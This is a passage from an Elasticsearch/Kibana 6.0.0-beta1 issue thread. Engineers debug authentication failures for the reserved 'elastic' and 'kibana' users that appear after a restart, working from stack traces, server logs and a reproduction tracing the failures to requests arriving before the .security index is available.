	at org.elasticsearch.action.support.TransportAction$RequestFilterChain.proceed(TransportAction.java:165) ~[elasticsearch-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.action.support.TransportAction.execute(TransportAction.java:139) ~[elasticsearch-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.action.support.TransportAction.execute(TransportAction.java:81) ~[elasticsearch-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.client.node.NodeClient.executeLocally(NodeClient.java:83) ~[elasticsearch-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.client.node.NodeClient.doExecute(NodeClient.java:72) ~[elasticsearch-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.client.support.AbstractClient.execute(AbstractClient.java:405) ~[elasticsearch-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.client.FilterClient.doExecute(FilterClient.java:67) ~[elasticsearch-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.xpack.security.InternalClient.doExecute(InternalClient.java:86) ~[?:?]
	at org.elasticsearch.client.support.AbstractClient.execute(AbstractClient.java:405) ~[elasticsearch-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.action.ActionRequestBuilder.execute(ActionRequestBuilder.java:71) ~[elasticsearch-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.xpack.security.authc.esnative.NativeUsersStore.getReservedUserInfo(NativeUsersStore.java:553) ~[?:?]
	at org.elasticsearch.xpack.security.authc.esnative.ReservedRealm.getUserInfo(ReservedRealm.java:241) ~[?:?]
	at org.elasticsearch.xpack.security.authc.esnative.ReservedRealm.doAuthenticate(ReservedRealm.java:95) ~[?:?]
	at org.elasticsearch.xpack.security.authc.support.CachingUsernamePasswordRealm.doAuthenticateAndCache(CachingUsernamePasswordRealm.java:170) ~[?:?]
	at org.elasticsearch.xpack.security.authc.support.CachingUsernamePasswordRealm.authenticateWithCache(CachingUsernamePasswordRealm.java:109) ~[?:?]
	at org.elasticsearch.xpack.security.authc.support.CachingUsernamePasswordRealm.authenticate(CachingUsernamePasswordRealm.java:94) ~[?:?]
	at org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lambda$consumeToken$13(AuthenticationService.java:284) ~[?:?]
	at org.elasticsearch.xpack.common.IteratingActionListener.run(IteratingActionListener.java:93) ~[?:?]
	at org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.consumeToken(AuthenticationService.java:320) ~[?:?]
	at org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lambda$extractToken$9(AuthenticationService.java:257) ~[?:?]
	at org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.extractToken(AuthenticationService.java:266) ~[?:?]
	at org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lambda$null$0(AuthenticationService.java:201) ~[?:?]
	at org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:60) ~[elasticsearch-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.xpack.security.authc.TokenService.getAndValidateToken(TokenService.java:193) ~[x-pack-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lambda$authenticateAsync$2(AuthenticationService.java:197) ~[x-pack-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lambda$lookForExistingAuthentication$4(AuthenticationService.java:228) ~[x-pack-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lookForExistingAuthentication(AuthenticationService.java:239) [x-pack-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.authenticateAsync(AuthenticationService.java:193) [x-pack-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.access$000(AuthenticationService.java:147) [x-pack-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.xpack.security.authc.AuthenticationService.authenticate(AuthenticationService.java:99) [x-pack-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.xpack.security.rest.SecurityRestFilter.handleRequest(SecurityRestFilter.java:69) [x-pack-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.rest.RestController.dispatchRequest(RestController.java:240) [elasticsearch-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.rest.RestController.tryAllHandlers(RestController.java:336) [elasticsearch-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.rest.RestController.dispatchRequest(RestController.java:174) [elasticsearch-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.http.netty4.Netty4HttpServerTransport.dispatchRequest(Netty4HttpServerTransport.java:495) [transport-netty4-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.http.netty4.Netty4HttpRequestHandler.channelRead0(Netty4HttpRequestHandler.java:72) [transport-netty4-6.0.0-beta1.jar:6.0.0-beta1]
	at io.netty.channel.SimpleChannelInboundHandler.channelRead(SimpleChannelInboundHandler.java:105) [netty-transport-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:362) [netty-transport-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:348) [netty-transport-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.channel.AbstractChannelHandlerContext.fireChannelRead(AbstractChannelHandlerContext.java:340) [netty-transport-4.1.13.Final.jar:4.1.13.Final]
	at org.elasticsearch.http.netty4.pipelining.HttpPipeliningHandler.channelRead(HttpPipeliningHandler.java:63) [transport-netty4-6.0.0-beta1.jar:6.0.0-beta1]
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:362) [netty-transport-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:348) [netty-transport-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.channel.AbstractChannelHandlerContext.fireChannelRead(AbstractChannelHandlerContext.java:340) [netty-transport-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.handler.codec.MessageToMessageDecoder.channelRead(MessageToMessageDecoder.java:102) [netty-codec-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.handler.codec.MessageToMessageCodec.channelRead(MessageToMessageCodec.java:111) [netty-codec-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:362) [netty-transport-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:348) [netty-transport-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.channel.AbstractChannelHandlerContext.fireChannelRead(AbstractChannelHandlerContext.java:340) [netty-transport-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.handler.codec.MessageToMessageDecoder.channelRead(MessageToMessageDecoder.java:102) [netty-codec-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:362) [netty-transport-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:348) [netty-transport-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.channel.AbstractChannelHandlerContext.fireChannelRead(AbstractChannelHandlerContext.java:340) [netty-transport-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.handler.codec.MessageToMessageDecoder.channelRead(MessageToMessageDecoder.java:102) [netty-codec-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:362) [netty-transport-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:348) [netty-transport-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.channel.AbstractChannelHandlerContext.fireChannelRead(AbstractChannelHandlerContext.java:340) [netty-transport-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.handler.codec.ByteToMessageDecoder.fireChannelRead(ByteToMessageDecoder.java:310) [netty-codec-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.handler.codec.ByteToMessageDecoder.channelRead(ByteToMessageDecoder.java:284) [netty-codec-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:362) [netty-transport-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:348) [netty-transport-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.channel.AbstractChannelHandlerContext.fireChannelRead(AbstractChannelHandlerContext.java:340) [netty-transport-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.channel.ChannelInboundHandlerAdapter.channelRead(ChannelInboundHandlerAdapter.java:86) [netty-transport-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:362) [netty-transport-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:348) [netty-transport-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.channel.AbstractChannelHandlerContext.fireChannelRead(AbstractChannelHandlerContext.java:340) [netty-transport-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.channel.DefaultChannelPipeline$HeadContext.channelRead(DefaultChannelPipeline.java:1334) [netty-transport-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:362) [netty-transport-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:348) [netty-transport-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.channel.DefaultChannelPipeline.fireChannelRead(DefaultChannelPipeline.java:926) [netty-transport-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.channel.nio.AbstractNioByteChannel$NioByteUnsafe.read(AbstractNioByteChannel.java:134) [netty-transport-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.channel.nio.NioEventLoop.processSelectedKey(NioEventLoop.java:644) [netty-transport-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.channel.nio.NioEventLoop.processSelectedKeysPlain(NioEventLoop.java:544) [netty-transport-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.channel.nio.NioEventLoop.processSelectedKeys(NioEventLoop.java:498) [netty-transport-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.channel.nio.NioEventLoop.run(NioEventLoop.java:458) [netty-transport-4.1.13.Final.jar:4.1.13.Final]
	at io.netty.util.concurrent.SingleThreadEventExecutor$5.run(SingleThreadEventExecutor.java:858) [netty-common-4.1.13.Final.jar:4.1.13.Final]
	at java.lang.Thread.run(Thread.java:745) [?:1.8.0_111]
[2017-07-28T12:25:13,119][ERROR][o.e.x.s.a.e.ReservedRealm] [FLMNnD2] failed to retrieve password hash for reserved user [elastic]
[2017-07-28T12:25:13,120][INFO ][o.e.x.s.a.AuthenticationService] [FLMNnD2] Authentication of [elastic] was terminated by realm [reserved] - failed to authenticate user [elastic]
[2017-07-28T12:25:13,247][INFO ][o.e.l.LicenseService     ] [FLMNnD2] license [e47e883b-1319-4980-af2f-f8b345ae224a] mode [trial] - valid
[2017-07-28T12:25:13,279][INFO ][o.e.g.GatewayService     ] [FLMNnD2] recovered [7] indices into cluster_state
[2017-07-28T12:25:13,727][WARN ][o.e.x.s.b.BootstrapElasticPassword] [FLMNnD2] elastic password was not bootstrapped because its password was already set
[2017-07-28T12:25:13,956][INFO ][o.e.x.s.a.AuthenticationService] [FLMNnD2] Authentication of [elastic] was terminated by realm [reserved] - failed to authenticate user [elastic]
[2017-07-28T12:25:13,986][INFO ][o.e.c.r.a.AllocationService] [FLMNnD2] Cluster health status changed from [RED] to [YELLOW] (reason: [shards started [[.kibana][0]] ...]).
```

Kibana logs: 

```
  log   [16:26:34.343] EMAIL REDACTED Status changed from red to red - Unable to connect to Elasticsearch at http://localhost:9200.
  log   [16:26:34.344] EMAIL REDACTED Status changed from red to red - Unable to connect to Elasticsearch at http://localhost:9200.
  log   [16:26:34.345] EMAIL REDACTED Status changed from red to red - Unable to connect to Elasticsearch at http://localhost:9200.
  log   [16:26:35.998] [warning][admin][elasticsearch] Unable to revive connection: http://localhost:9200/
```*Original comment by @bhavyarm:*

cc @jaymode @tbrooks8  @tvernum  - I ran into this in all BCs of beta1 release. Sometimes, restarting ES/Kibana doesn't do the trick anymore. I have to start with a fresh install for my QA. I am working on darwin_x86_64. FYI and sorry if I am being too paranoid. Thanks!*Original comment by @bhavyarm:*

Wrong error logs.Sorry. I was working on a compatibility ticket.*Original comment by @tvernum:*

What's your cluster health? Those look like errors you would get if shards were failing to recover or recovering slowly.*Original comment by @bhavyarm:*

@tvernum the last logs I posted were wrong logs. They were not for this issue. Were you referring to them or to the logs which I logged 3 days ago? Thanks!*Original comment by @tvernum:*

I was referring to the original issue.*Original comment by @bhavyarm:*

Happened again on a fresh install of BC5 for 6.0.0-beta. This is what my logs say about cluster health. 

```
[2017-08-01T09:55:06,154][INFO ][o.e.c.r.a.AllocationService] [YAcB6bG] Cluster health status changed from [YELLOW] to [GREEN] (reason: [shards started [[.security-v6][0]] ...]).
```
Then I am hitting the auth exception again. I restarted ES while Kibana is running. ES came up with with auth exceptions. I stopped both ES and Kibana after - and Restarted ES waited till 
```[2017-08-01T10:00:07,592][WARN ][o.e.x.s.b.BootstrapElasticPassword] [YAcB6bG] elastic password was not bootstrapped because its password was already set
[2017-08-01T10:00:07,845][INFO ][o.e.c.r.a.AllocationService] [YAcB6bG] Cluster health status changed from [RED] to [YELLOW] (reason: [shards started [[.monitoring-es-6-2017.08.01][0]] ...]).
``` 
and restarted Kibana. No dice. I am still hitting auth exception. 

```
[2017-08-01T09:55:06,480][INFO ][o.e.x.s.b.BootstrapElasticPassword] [YAcB6bG] elastic password was bootstrapped successfully
[2017-08-01T09:55:12,107][INFO ][o.e.c.m.MetaDataCreateIndexService] [YAcB6bG] [.monitoring-es-6-2017.08.01] creating index, cause [auto(bulk api)], templates [.monitoring-es], shards [1]/[1], mappings [doc]
[2017-08-01T09:55:12,290][INFO ][o.e.c.m.MetaDataCreateIndexService] [YAcB6bG] [.watches] creating index, cause [auto(bulk api)], templates [.watches], shards [1]/[1], mappings [doc]
[2017-08-01T09:55:12,351][INFO ][o.e.c.m.MetaDataMappingService] [YAcB6bG] [.watches/kJDP0zzqS2SJ4yM7-MEfNA] update_mapping [doc]
[2017-08-01T09:55:26,862][INFO ][o.e.x.s.a.AuthenticationService] [YAcB6bG] Authentication of [elastic] was terminated by realm [reserved] - failed to authenticate user [elastic]
```*Original comment by @jaymode:*

@tbrooks8 can you take a look at this? It appears to be an issue with the bootstrap on subsequent restarts.*Original comment by @tbrooks8:*

@skearns64 described this issue in the kibana board on slack:

> ... the issue looks to be a startup condition in ES auth (allowing requests before the .security index is available), which is hit by the monitoring plugin in Kibana. The monitoring plugin gets an auth error, and stops retrying..

Generally - this is unrelated to the bootstrap password work. It is just that the security index is not ready yet when the request is being made. I imagine that this race was not noticed as much in the past, as you could authenticate without the index being ready (with the default password).

I'm not sure what implication this finding has going forward. It seems like kibana monitoring will fail going forward if as ES node is restarted as it will normally make the request before the index is ready?*Original comment by @skearns64:*

@jaymode @tbrooks8 - I can reproduce and I think I know what's happening.. There are two issues conspiring to cause this, and I'm honestly not sure which one is the problem. 

To reproduce on 6.0 Beta 1 BC4+: 
 1. Unpack ES + Kibana and install X-Pack
 1. Create Keystore and bootstrap password in ES
 1. Start ES
 1. Set elastic and kibana user passwords with the ES password setup script
 1. Set elasticsearch.username and password in kibana.yml to the kibana user.
 1. Start Kibana
 1. Observe that everything works :) 
 1. Stop ES. Wait at least 10 seconds for Kibana to fully notice ES is down. You'll see Kibana logging a bunch of messages every few seconds as it tries to connect to ES
 1. Start ES. 
 1. Issue 1: Observe Auth failure for `kibana` user in ES logs during ES startup
   * ES appears to allows requests before the .security index is available, so some of the Kibana requests fail auth because the native realm isn't yet available.
 1. Issue 2: When the Kibana Monitoring Plugin sees a failed login, it stops trying, and the Kibana monitoring plugin stays in the red state forever, which (somewhat strangely) results in the Kibana error message about licensing shown above. 

@jaymode - do we expect requests to be allowed before the native realm is available? 

@pickypg @tsullivan @bohyun-e - do we expect the Kibana monitoring plugin to stop trying when it receives an auth failure? 



Kibana Log (note the last line of Error log):

```
  log   [14:31:08.871] [warning][elasticsearch][monitoring-ui] Unable to revive connection: http://localhost:9200/
  log   [14:31:08.872] [warning][elasticsearch][monitoring-ui] No living connections
  log   [14:31:11.290] EMAIL REDACTED Status changed from red to red - Elasticsearch is still initializing the kibana index.
  log   [14:31:11.291] EMAIL REDACTED Status changed from red to red - Elasticsearch is still initializing the kibana index.
  log   [14:31:11.291] EMAIL REDACTED Status changed from red to red - Elasticsearch is still initializing the kibana index.
  log   [14:31:11.292] EMAIL REDACTED Status changed from red to red - Elasticsearch is still initializing the kibana index.
  log   [14:31:11.293] EMAIL REDACTED Status changed from red to red - Elasticsearch is still initializing the kibana index.
  log   [14:31:11.293] EMAIL REDACTED Status changed from red to red - Elasticsearch is still initializing the kibana index.
  log   [14:31:11.294] EMAIL REDACTED Status changed from red to red - Elasticsearch is still initializing the kibana index.
  log   [14:31:11.295] EMAIL REDACTED Status changed from red to red - Elasticsearch is still initializing the kibana index.
  log   [14:31:11.295] EMAIL REDACTED Status changed from red to red - Elasticsearch is still initializing the kibana index.
  log   [14:31:11.296] EMAIL REDACTED Status changed from red to red - Elasticsearch is still initializing the kibana index.
  log   [14:31:11.296] EMAIL REDACTED Status changed from red to red - Elasticsearch is still initializing the kibana index.
  log   [14:31:11.441] EMAIL REDACTED Status changed from red to red - Elasticsearch is still initializing the Monitoring indices
  log   [14:31:13.857] EMAIL REDACTED Status changed from red to green - Kibana index ready
  log   [14:31:13.858] [info][status][ui settings] Status changed from red to green - Ready
  log   [14:31:13.859] EMAIL REDACTED Status changed from red to green - Ready
  log   [14:31:13.860] EMAIL REDACTED Status changed from red to green - Ready
  log   [14:31:13.861] EMAIL REDACTED Status changed from red to green - Ready
  log   [14:31:13.863] EMAIL REDACTED Status changed from red to green - Ready
  log   [14:31:13.865] EMAIL REDACTED Status changed from red to green - Ready
  log   [14:31:13.866] EMAIL REDACTED Status changed from red to green - Ready
  log   [14:31:13.867] EMAIL REDACTED Status changed from red to green - Ready
  log   [14:31:13.868] EMAIL REDACTED Status changed from red to green - Ready
  log   [14:31:13.869] EMAIL REDACTED Status changed from red to green - Ready
  log   [14:31:13.870] EMAIL REDACTED Status changed from red to green - Ready
  log   [14:31:13.949] EMAIL REDACTED Status changed from red to green - Ready
```

ES Logs: 

```
[2017-08-01T09:22:07,175][INFO ][o.e.n.Node               ] [] initializing ...
[2017-08-01T09:22:07,256][INFO ][o.e.e.NodeEnvironment    ] [d1S5k1-] using [1] data paths, mounts [[/ (/dev/disk1)]], net usable_space [214.1gb], net total_space [464.6gb], types [hfs]
[2017-08-01T09:22:07,256][INFO ][o.e.e.NodeEnvironment    ] [d1S5k1-] heap size [990.7mb], compressed ordinary object pointers [true]
[2017-08-01T09:22:07,298][INFO ][o.e.n.Node               ] node name [d1S5k1-] derived from node ID [d1S5k1-lRnWrLl8oj6YMjA]; set [node.name] to override
[2017-08-01T09:22:07,299][INFO ][o.e.n.Node               ] version[6.0.0-beta1], pid[2760], build[8de0a1e/2017-07-30T01:54:20.242Z], OS[Mac OS X/10.12.6/x86_64], JVM[Oracle Corporation/Java HotSpot(TM) 64-Bit Server VM/1.8.0_111/25.111-b14]
[2017-08-01T09:22:07,299][INFO ][o.e.n.Node               ] JVM arguments [-Xms1g, -Xmx1g, -XX:+UseConcMarkSweepGC, -XX:CMSInitiatingOccupancyFraction=75, -XX:+UseCMSInitiatingOccupancyOnly, -XX:+AlwaysPreTouch, -Xss1m, -Djava.awt.headless=true, -Dfile.encoding=UTF-8, -Djna.nosys=true, -XX:-OmitStackTraceInFastThrow, -Djdk.io.permissionsUseCanonicalPath=true, -Dio.netty.noUnsafe=true, -Dio.netty.noKeySetOptimization=true, -Dio.netty.recycler.maxCapacityPerThread=0, -Dlog4j.shutdownHookEnabled=false, -Dlog4j2.disable.jmx=true, -XX:+HeapDumpOnOutOfMemoryError, -Des.path.home=/skearns/es/elasticsearch-6.0.0-beta1, -Des.path.conf=/skearns/es/elasticsearch-6.0.0-beta1/config]
[2017-08-01T09:22:07,300][WARN ][o.e.n.Node               ] version [6.0.0-beta1] is a pre-release version of Elasticsearch and is not suitable for production
[2017-08-01T09:22:09,604][INFO ][o.e.p.PluginsService     ] [d1S5k1-] loaded module [aggs-matrix-stats]
[2017-08-01T09:22:09,604][INFO ][o.e.p.PluginsService     ] [d1S5k1-] loaded module [analysis-common]
[2017-08-01T09:22:09,605][INFO ][o.e.p.PluginsService     ] [d1S5k1-] loaded module [ingest-common]
[2017-08-01T09:22:09,605][INFO ][o.e.p.PluginsService     ] [d1S5k1-] loaded module [lang-expression]
[2017-08-01T09:22:09,605][INFO ][o.e.p.PluginsService     ] [d1S5k1-] loaded module [lang-mustache]
[2017-08-01T09:22:09,605][INFO ][o.e.p.PluginsService     ] [d1S5k1-] loaded module [lang-painless]
[2017-08-01T09:22:09,606][INFO ][o.e.p.PluginsService     ] [d1S5k1-] loaded module [parent-join]
[2017-08-01T09:22:09,606][INFO ][o.e.p.PluginsService     ] [d1S5k1-] loaded module [percolator]
[2017-08-01T09:22:09,606][INFO ][o.e.p.PluginsService     ] [d1S5k1-] loaded module [reindex]
[2017-08-01T09:22:09,607][INFO ][o.e.p.PluginsService     ] [d1S5k1-] loaded module [repository-url]
[2017-08-01T09:22:09,607][INFO ][o.e.p.PluginsService     ] [d1S5k1-] loaded module [transport-netty4]
[2017-08-01T09:22:09,607][INFO ][o.e.p.PluginsService     ] [d1S5k1-] loaded module [tribe]
[2017-08-01T09:22:09,608][INFO ][o.e.p.PluginsService     ] [d1S5k1-] loaded plugin [repository-s3]
[2017-08-01T09:22:09,608][INFO ][o.e.p.PluginsService     ] [d1S5k1-] loaded plugin [x-pack]
[2017-08-01T09:22:11,223][DEBUG][o.e.a.ActionModule       ] Using REST wrapper from plugin org.elasticsearch.xpack.XPackPlugin
[2017-08-01T09:22:12,004][INFO ][o.e.x.m.j.p.l.CppLogMessageHandler] [controller/2781] EMAIL REDACTED controller (64 bit): Version 6.0.0-beta1 (Build ea4af9fe157b48) Copyright (c) 2017 Elasticsearch BV
[2017-08-01T09:22:12,087][INFO ][o.e.d.DiscoveryModule    ] [d1S5k1-] using discovery type [zen]
[2017-08-01T09:22:12,995][INFO ][o.e.n.Node               ] initialized
[2017-08-01T09:22:12,996][INFO ][o.e.n.Node               ] [d1S5k1-] starting ...
[2017-08-01T09:22:18,299][INFO ][o.e.t.TransportService   ] [d1S5k1-] publish_address {127.0.0.1:9300}, bound_addresses {[fe80::1]:9300}, {[::1]:9300}, {127.0.0.1:9300}
[2017-08-01T09:22:18,311][WARN ][o.e.b.BootstrapChecks    ] [d1S5k1-] Default SSL key and certificate do not provide security; please generate keys and certificates
[2017-08-01T09:22:18,311][WARN ][o.e.b.BootstrapChecks    ] [d1S5k1-] Please set a passphrase using the elasticsearch-keystore tool for the setting [xpack.security.authc.token.passphrase] that is at least 8 characters in length and does not match the default passphrase or disable the token service using the [xpack.security.authc.token.enabled] setting
[2017-08-01T09:22:18,311][WARN ][o.e.b.BootstrapChecks    ] [d1S5k1-] HTTPS is required in order to use the token service. Please enable HTTPS using the [xpack.security.http.ssl.enabled] setting or disable the token service using the [xpack.security.authc.token.enabled] setting.
[2017-08-01T09:22:21,366][INFO ][o.e.c.s.MasterService    ] [d1S5k1-] zen-disco-elected-as-master ([0] nodes joined), reason: new_master {d1S5k1-}{d1S5k1-lRnWrLl8oj6YMjA}{MXaWDyzjR_6Rq7t7hwD8ng}{127.0.0.1}{127.0.0.1:9300}{ml.enabled=true}
[2017-08-01T09:22:21,372][INFO ][o.e.c.s.ClusterApplierService] [d1S5k1-] new_master {d1S5k1-}{d1S5k1-lRnWrLl8oj6YMjA}{MXaWDyzjR_6Rq7t7hwD8ng}{127.0.0.1}{127.0.0.1:9300}{ml.enabled=true}, reason: apply cluster state (from master [master {d1S5k1-}{d1S5k1-lRnWrLl8oj6YMjA}{MXaWDyzjR_6Rq7t7hwD8ng}{127.0.0.1}{127.0.0.1:9300}{ml.enabled=true} committed version [1] source [zen-disco-elected-as-master ([0] nodes joined)]])
[2017-08-01T09:22:21,422][INFO ][o.e.x.s.t.n.SecurityNetty4HttpServerTransport] [d1S5k1-] publish_address {127.0.0.1:9200}, bound_addresses {[fe80::1]:9200}, {[::1]:9200}, {127.0.0.1:9200}
[2017-08-01T09:22:21,423][INFO ][o.e.n.Node               ] [d1S5k1-] started
[2017-08-01T09:22:22,095][ERROR][o.e.x.s.a.e.NativeUsersStore] [d1S5k1-] failed to retrieve built in user [kibana] info
org.elasticsearch.action.NoShardAvailableActionException: No shard available for [get [.security][doc][reserved-user-kibana]: routing [null]]
	at org.elasticsearch.action.support.single.shard.TransportSingleShardAction$AsyncSingleAction.perform(TransportSingleShardAction.java:209) ~[elasticsearch-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.action.support.single.shard.TransportSingleShardAction$AsyncSingleAction.start(TransportSingleShardAction.java:186) ~[elasticsearch-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.action.support.single.shard.TransportSingleShardAction.doExecute(TransportSingleShardAction.java:95) ~[elasticsearch-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.action.support.single.shard.TransportSingleShardAction.doExecute(TransportSingleShardAction.java:59) ~[elasticsearch-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.action.support.TransportAction.doExecute(TransportAction.java:143) ~[elasticsearch-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.action.support.TransportAction$RequestFilterChain.proceed(TransportAction.java:167) ~[elasticsearch-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.xpack.security.action.filter.SecurityActionFilter.lambda$apply$0(SecurityActionFilter.java:104) ~[?:?]
	at org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:60) ~[elasticsearch-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.xpack.security.action.filter.SecurityActionFilter.lambda$authorizeRequest$3(SecurityActionFilter.java:178) ~[?:?]
	at org.elasticsearch.xpack.security.authz.AuthorizationUtils$AsyncAuthorizer.maybeRun(AuthorizationUtils.java:124) ~[?:?]
	at org.elasticsearch.xpack.security.authz.AuthorizationUtils$AsyncAuthorizer.setRunAsRoles(AuthorizationUtils.java:118) ~[?:?]
	at org.elasticsearch.xpack.security.authz.AuthorizationUtils$AsyncAuthorizer.authorize(AuthorizationUtils.java:106) ~[?:?]
	at org.elasticsearch.xpack.security.action.filter.SecurityActionFilter.authorizeRequest(SecurityActionFilter.java:180) ~[?:?]
	at org.elasticsearch.xpack.security.action.filter.SecurityActionFilter.lambda$applyInternal$2(SecurityActionFilter.java:157) ~[?:?]
	at org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:60) ~[elasticsearch-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lambda$authenticateAsync$2(AuthenticationService.java:195) ~[?:?]
	at org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lambda$lookForExistingAuthentication$4(AuthenticationService.java:228) ~[?:?]
	at org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lookForExistingAuthentication(AuthenticationService.java:239) ~[?:?]
	at org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.authenticateAsync(AuthenticationService.java:193) ~[?:?]
	at org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.access$000(AuthenticationService.java:147) ~[?:?]
	at org.elasticsearch.xpack.security.authc.AuthenticationService.authenticate(AuthenticationService.java:116) ~[?:?]
	at org.elasticsearch.xpack.security.action.filter.SecurityActionFilter.applyInternal(SecurityActionFilter.java:156) ~[?:?]
	at org.elasticsearch.xpack.security.action.filter.SecurityActionFilter.apply(SecurityActionFilter.java:116) ~[?:?]
	at org.elasticsearch.action.support.TransportAction$RequestFilterChain.proceed(TransportAction.java:165) ~[elasticsearch-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.action.support.TransportAction.execute(TransportAction.java:139) ~[elasticsearch-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.action.support.TransportAction.execute(TransportAction.java:81) ~[elasticsearch-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.client.node.NodeClient.executeLocally(NodeClient.java:83) ~[elasticsearch-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.client.node.NodeClient.doExecute(NodeClient.java:72) ~[elasticsearch-6.0.0-beta1.jar:6.0.0-beta1]
	at org.elasticsearch.client.support.AbstractClient.execute(AbstractClient.java:405) ~[elasticsearch-6.0.0-beta1.jar:6.0.0-beta1]
